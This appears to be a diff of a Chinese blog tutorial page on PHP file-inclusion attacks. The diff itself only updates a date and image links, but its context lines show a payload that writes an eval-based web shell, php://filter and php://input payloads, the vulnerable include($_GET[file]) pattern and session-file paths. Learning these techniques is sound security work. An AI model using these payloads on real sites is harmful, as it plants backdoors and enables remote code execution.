@@ -358,7 +358,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-02-07
+                    2021-02-08
                 </div>
                 
 
@@ -585,7 +585,7 @@ include($_GET[file]);
 [POST DATA 3]:&lt;?php fputs(fopen("shell.php","w"),'&lt;?php @eval($_POST[cmd]);?&gt;');?&gt;	#我没写入成功，缘由待查。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:filter"></a>php:filter</h4></li>
 <li><p>介绍<br><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数很是有用，相似 <code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>， 在数据流内容读取以前没有机会应用其余过滤器。</p>
-<p><code>php://filter</code>目标使用如下的参数做为它路径的一部分。 复合过滤链可以在一个路径上指定。详细使用这些参数能够参考具体范例。<br><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/25be41facc7e4715934626bc731c9dd2-1.jpg" alt="在这里插入图片描述"></p>
+<p><code>php://filter</code>目标使用如下的参数做为它路径的一部分。 复合过滤链可以在一个路径上指定。详细使用这些参数能够参考具体范例。<br><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208203954389.png" alt="image-20210208203954389"></p>
 </li>
 <li><p>使用条件</p>
 <ol>
@@ -605,7 +605,7 @@ include($_GET[file]);
 [GAT DATA 3]:    filter.php?file=php://filter/resource=php://input    [POST DATA]:    &lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3></li>
 </ul>
-<p>简介<br>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，而且对于应用程序中的全部页面都是可用的。在您把用户信息存储到 PHP session 中以前，首先必须使用<code>session_start()</code>启动会话。<br>php的session文件的保存路径能够再phpinfo的session.save_path查询到<br><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/8fdaca63a2e445d09ef18358e0241e3b-2.png" alt="在这里插入图片描述"><br><img src="https://wxs211.oss-cn-shenzhen.aliyuncs.com/picgo/d19caeab65644e959291bfbbe4cff812-2.png" alt="在这里插入图片描述"><br>常见的php-session存放位置：</p>
+<p>简介<br>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，而且对于应用程序中的全部页面都是可用的。在您把用户信息存储到 PHP session 中以前，首先必须使用<code>session_start()</code>启动会话。<br>php的session文件的保存路径能够再phpinfo的session.save_path查询到<br><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208203749051.png" alt="image-20210208203749051"><br>常见的php-session存放位置：</p>
 <pre class="line-numbers language-none"><code class="language-none">/var/lib/php/sess_PHPSESSID
 /var/lib/php/sess_PHPSESSID
 /tmp/sess_PHPSESSID
